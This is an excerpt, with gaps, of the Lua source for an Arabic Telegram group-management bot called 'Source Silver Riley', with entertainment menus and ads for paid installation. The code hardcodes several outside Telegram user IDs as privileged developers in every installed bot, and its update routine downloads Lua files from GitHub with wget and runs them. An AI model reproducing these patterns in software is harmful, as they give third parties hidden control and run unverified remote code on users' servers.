...
io.write('\27[0;31m\n ارسل لي توكن البوت الان 𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘\n27[0;39;49m')
local json = JSON.decode(url)
database:set(id_server..":token_username",json.result.username)
database:set(id_server..":token",token)
end 
else
print('\27[0;35m𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي 𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘\n\27[0;33;49m')
...
io.write('\27[1;31m 𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘 ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘"
echo "TG IS NOT FIND IN FILES BOT"
echo "𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘 𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘"
exit 1
fi
if [ ! $token ]; then
echo "𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘 𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘"
...
print([[
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
	تم تنصيب البوت فى سورس سليفر رايلي
╚≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╝
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
    𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝘴𝘰𝘶𝘳𝘤𝘦 𝘴𝘪𝘭𝘷𝘦𝘳 𝘳𝘪𝘭𝘦𝘺❦
╚≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╝
 ≂≂≂≂≂≂≂≂≂𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗≂≂≂≂≂≂≂≂≂
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
	هلا ومرحبا بك فى سورس سيلفر رايلي
╚≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╝
   
                          
> CH ✰ ↝@SourceRiley↜
~> DEVELOPER ✰ {text = @Ahmed_Riley
]])
...
token = sudos.token 
--- start functions 𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘
--------------------------------------------------------------------------------------------------------------
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/SourceRiley/SourceRiley2/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1878891780,1443455396,1965588568,1589498513,1419690087}   
...
if tonumber(user_id) == tonumber(1878891780) then  
var = true 
elseif tonumber(user_id) == tonumber(1589498513) then
var = true  
elseif tonumber(user_id) == tonumber(1965588568) then
var = true  
elseif tonumber(user_id) == tonumber(1443455396) then
var = true  
elseif tonumber(user_id) == tonumber(1419690087) then
var = true  
...
local UserName = (data.username_ or "SourceRiley")
...
Send(chat,msg.id_,'\n- الرتبة : مشرف  '..'\n- والصلاحيات هي 𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘 \n━━━━━━━━━━'..'\n- تغير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n- مسح الرسائل ↞ ❴ '..delete..' ❵'..'\n- حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n- دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n- تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n- اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼")  
...
{'↜قسم التسليه'},
{'↜قسم السورس'},
{'↜امان بوتات للاستخدام'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'سيلفر رايلي') 
local DRAGON_Msg = { 
...
{
{text = 'مـطـوور لبـوت ↺', url="http://t.me/"..sudos.UserName},
},
{
...
local SourceRiley = database:get(bot_id..'text:ch:user')
if SourceRiley then
send(msg.chat_id_, msg.id_,'['..SourceRiley..']')
else
...
{'المطور','الاحصائيات'},
{'𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘'},
{'قسم مطورين السورس','قـسم مـسح&اضـف'},
{'قـسم الاشـتراك'},
...
local Text = ' 🌏تم ارسال الملصق من 𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘\n - '..Name
...
os.execute('wget https://raw.githubusercontent.com/SourceRiley/SourceRiley2/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,' 🌏 تم تحديث السورس')
dofile('DRAGON.lua')  
end

if text == '/start' and DevSoFi(msg) then 
local Text = '🌏انت الان المطور الاساسي في البوت \n 🌏سورس سيلفر رايلي\n 🌏يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/SourceRiley)'
keyboard = {} 
keyboard.inline_keyboard = {
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/S_AD_26/8/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'قسم مطورين السورس' and DevSoFi(msg) then 
...
local Key = {
{'تويت','صراحه','مريم','عقاب'},
{'نمله','مهنتي','اسئله','تحليل'},
{'حرف','لو خيروك','مستقبلي'},
{'تويت بالصور','لو خيروك بالصور'},
{'نسبه الحب','نسبه الغباء','كشف الكدب'},
{'حساب الوزن','حروف بالصور'},
{'نسبه الانوثه','الالعاب','اسكرينات'},
{'لعبه الذكاء','العاب مطوره'},
{'العوده🍂'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 
...
local Key = {
{'استوري رايلي'},
{'غنيلي','استوري','متحركه','اغاني'},
{'ثمات','تصميم','غنيلي بفيديو'},
{'بايو','انا مين','افلام'},
{'قصص رعب','صور رعب','افلام رعب'},
{'افلام عربي','افلام اجنبي'},
{'افلام كرتون','كرتون'},
{'صور انيمي','رامزيات ولاد'},
{'الاخبار','تصميمات سيلفر رايلي','مميزات'},
{'رامزيات بنات','رامزيات كابلز'},
...
local Key = {
{'نكته','بوستات','كتبات','خلفيات'},
{'روايات','صراحه','انصحني'},
{'بروفيل','صراحه بالصور'},
{'حروف بالصور','نكته بالصور'},
{'اكشن اولاين','مسبقات اولاين'},
{'منوعات اولاين','ايدي','باد'},
{'العوده🍂'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 
...
if text == '↜امان بوتات للاستخدام' then
local Text = 'مرحبا بك في قسم البوتات المستخدمه..♥️'
local Key = {
{'مصنع البوتات'},
{'بوت عمل ازرار','بوت المسابقه'},
{'بوت الحمايه'},
{'بوت اذكار وادعيه','بوت دعم قنوات'},
{'لتواصل معي','بوت الاغاني'},
{'العوده🍂'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطورين السورس☎️', url="https://t.me/SourceRiley2"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/SourceRiley/107/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == '𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس سيلفر رايلي ادخل وتابع الجديد](t.me/SourceRiley)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼', url="t.me/SourceRiley"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SourceRiley/107/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '━┅┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉┉━' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس سيلفر رايلي ادخل وتابع الجديد](t.me/SourceRiley)
]] 
keyboard = {}  
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SourceRiley/107/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'معلومات الكيبورد' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/SourceRiley)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/SourceRiley"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
usertext = '\n 🌏 الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'SourceRiley')..')'
status  = '\n 🌏 تم ترقيته مطور'
...
usertext = '\n 🌏 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'SourceRiley')..')'
status  = '\n 🌏 تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 🌏 الـعـضو   ⇇[↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'SourceRiley')..') \n 🌏 '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "سيلفر رايلي")
...
send(msg.chat_id_,0," 🌏 الـعـضو  : {["..data.first_name_.."](T.ME/SourceRiley)}\n 🌏 ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " 🌏 عذرا  ⇇{["..data.first_name_.."](T.ME/SourceRiley)}\n 🌏 عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
local Text = [[ 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
[🎗╎ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚍𝚎𝚊𝚛 ](http://t.me/SourceRiley)
[🚶‍♂╎𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚂𝙾𝚄𝚁𝙲𝙴 𝙸𝙽 𝚃𝙴𝙻𝙶𝚁𝙰𝙼 ](http://t.me/SourceRiley)
[ ☠╎ 𝚂𝚃𝚁𝙻𝚅𝙴 𝙵𝙾𝚁 𝚃??𝙴 𝙱𝙴𝚂𝚃 ](http://t.me/SourceRiley)
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
──┈┈┈┄┄╌╌╌╌┄┄┈┈┈
•  𝖼𝗁 - [𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗](t.me/SourceRiley)
──┈┈┈┄┄╌╌╌╌┄┄┈┈┈
]]
keyboard = {}
keyboard.inline_keyboard = {
{{text = ' ❨𝐑𝐈𝐋𝐄𝐘 𖠢 🌏❩',url="t.me/Ahmed_Riley"}},
{{text = ' ❨koko 🌏❩',url="t.me/koko_Egypts_star"}},
{{text = ' ❨𝐒𝐀𝐃 🌏❩',url="t.me/cv_sc"}},
{{text = '˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼',url="t.me/SourceRiley"}},
{{text = 'اضف البوت الي مجموعتك ✰ ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/S_AD_26/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'سعر التنصيب' then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
🌏سعر التنصيب علي سورس سيلفر رايلي 
🌏سعر التنصيب العادي 20جنيه فقط
🌏للتواصل اتبع الازرار بالاسفل ⇓
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨𖣘• ⁽𝐑𝐈𝐋𝐄𝐘 𖠢₎ •𖣘❩', url="t.me/Ahmed_Riley"}}, 
{{text = '˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼',url="t.me/SourceRiley"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/SourceRiley/107&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'رايلي مبرمج السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
↝المبرمج رايلي لو حابب تتواصل معاه
اتبع الزر إلى تحت ↜
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
...
local Text = [[ 
 🌏 من أحسن السورسات على التليجرام سورس سيلفر رايلي 🌏
بجد سورس أمان جدا وفي مميزات جامده
تع نصب بوتك عندنا لو محظور
كلمنا علي تواصل وبس كدا 💛🌏' 
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《𝙻𝚃𝚄𝙰𝚂𝙸𝙻 𝚂𝙾𝚄𝚁𝙲𝙴 》', url="t.me/Ahmed_Riley"}}, 
{{text = '˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼', url="t.me/SourceRiley"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/SourceRiley/107&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
...
if text == 'قناه السورس يقمدد' then
local Text = [[ 
 🌏 من أحسن السورسات على التليجرام سورس سيلفر رايلي 🌏
بجد سورس أمان جدا وفي مميزات جامده
تع نصب بوتك عندنا لو محظور
...
if text == 'عايز سورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
┌ سعر السورس عند فريق سيلفر رايلي
├ السورسات بتبدا مت100لي 240ج
├ سعر المصنع200
└ سعر السيرفر ،100,و 4 بي160, 8بي200
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨𖣘• ⁽𝐑𝐈𝐋𝐄𝐘 𖠢₎ •𖣘❩', url="t.me/Ahmed_Riley"}}, 
...
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' 🌏 اصدار سورس سيلفر رايلي{ 4x☆}')
end
...
echo '⇗ نظام التشغيل ⇖•\n* '"$linux_version"'*' 
echo '𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘\n 🌏↝ الذاكره العشوائيه ↜  ↚\n* '"$memUsedPrc"'*'
echo '𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘\n 🌏↝ وحـده الـتـخـزيـن ↜  ↚\n* '"$HardDisk"'*'
...
local Text = [[
[ 𖠪 اهلا بك في سورس سيلفر رايلي الجمدان 𖠪](http://t.me/SourceRiley)
[ 𖠪 عايز بوت بأسعار منسبه وبوت مميز كلمني 𖠪](http://t.me/SourceRiley)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ❨𖣘• ⁽𝐑𝐈𝐋𝐄𝐘 𖠢₎ •𖣘❩',url="t.me/Ahmed_Riley"}},
...
if text == 'رايلي' or text == 'رايلي ' or text == 'مبرمج السورس'  then
local Text = [[
رايلي مبرمج سورس سيلفر رايلي للتواصل معه اتبع الزر الاسفل ⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ❨𖣘• ⁽𝐑𝐈𝐋𝐄𝐘 𖠢₎ •𖣘❩',url="t.me/Ahmed_Riley"}},
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SourceRiley/99/27&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'كوكو' or text == 'كوكو' or text == 'مطور السورس'  then
local Text = [[
كوكو مطور سورس سيلفر رايلي للتواصل معه اتبع الزر الاسفل ⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ❨𖣘• ⁽koko₎ •𖣘❩',url="t.me/koko_Egypts_star"}},
{{text = '˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼',url="t.me/SourceRiley"}},
{{text = 'اضف البوت الي مجموعتك ✰ ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/S_5A_D/70/27&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'مصنع البوتات' or text == 'عايز بوت مجاني' or text == 'عايزه بوت مجاني'  then
local Text = [[
من احسن المصانع لعمل بوتات المجانيه⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ❨𖣘• ⁽𝗠𝗔𝗦𝗡𝗔 𝗣𝗢𝗧𝗔𝗧₎ •𖣘❩',url="t.me/TeamViking_bot"}},
{{text = 'اضف البوت الي مجموعتك ✰ ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Asaliya_Egypt_1/262/27&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'بوت المسابقه' then
local Text = [[
من احسن البوتات للمسابقات التلي في القنوات⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ❨𖣘• ⁽𝘿𝙀𝙑 𝘽𝙊𝙏₎ •𖣘❩',url="t.me/ZARAIR_BOT"}},
{{text = 'اضف البوت الي مجموعتك ✰ ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SourceRiley/115/27&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'بوت عمل ازرار' then
local Text = [[
من احسن البوتات لعمل ازرار للمنشورات⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ❨𖣘• ⁽𝘿𝙀𝙑 𝘽𝙊𝙏₎ •𖣘❩',url="t.me/Asaliyae_gypt_bot"}},
{{text = 'اضف البوت الي مجموعتك ✰ ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SourceRiley/114/27&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'بوت الحمايه' then
local Text = [[
من احسن البوتات علي التلي بوت الحمايه هذا⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ❨𖣘• ⁽𝘿𝙀𝙑 𝘽𝙊𝙏₎ •𖣘❩',url="t.me/Ahmed_Riley_bot"}},
{{text = 'اضف البوت الي مجموعتك ✰ ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SourceRiley/114/27&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
if text == 'بوت دعم قنوات' then
local Text = [[
من احسن البوتات علي التلي لدعم القنوات والجروبات باسرع الطرق⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ❨𖣘• ⁽𝘿𝙀𝙑 𝘽𝙊𝙏₎ •𖣘❩',url="t.me/Ahmed_Rileybot"}},
{{text = 'اضف البوت الي مجموعتك ✰ ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SourceRiley/7&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'بوت اذكار وادعيه' then
local Text = [[
من احسن البوتات لذكر الله في التلي دلوقتي تقدر تضيف بوت الاذكار اذا كان في جروبك او قناتك وهو بيشتغل تلقائي بعد ان ترفعهوا ادمن⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ❨𖣘• ⁽𝘿𝙀𝙑 𝘽𝙊𝙏₎ •𖣘❩',url="t.me/RORO1BOT"}},
{{text = 'اضف البوت الي مجموعتك ✰ ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SourceRiley/109/27&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'لتواصل معي' then
local Text = [[
لو حابب تخش تتكلم مع المبرمج رايلي اتبع الازرار⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ❨𖣘• ⁽𝘿𝙀𝙑 𝐑𝐈𝐋𝐄𝐘₎ •𖣘❩',url="t.me/Ahmed_Riley"}},
{{text = 'اضف البوت الي مجموعتك ✰ ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SourceRiley/99/27&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
if text == 'بوت الاغاني' then
local Text = [[
من احسن البوتات علي التلي للاغاني ولا بيقطع ولا اي حاجه وسريع جدا ⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ❨𖣘• ⁽𝘿𝙀𝙑 𝘽𝙊𝙏₎ •𖣘❩',url="t.me/E_l_k_e_a_t_i_b16bot"}},
{{text = 'اضف البوت الي مجموعتك ✰ ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/SourceRiley/117&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end


if text == 'مطورين السورس' then
local Text = [[ 
مطورين ومبرمجين سورس سيلفر رايلي اتبع الازرار للتواصل معهم ⬇️🧿
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطورين السورس☎️', url="https://t.me/SourceRiley2"}}, 
...
if text == "راب" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/hagsjsv/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == "تصميمات سيلفر رايلي" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
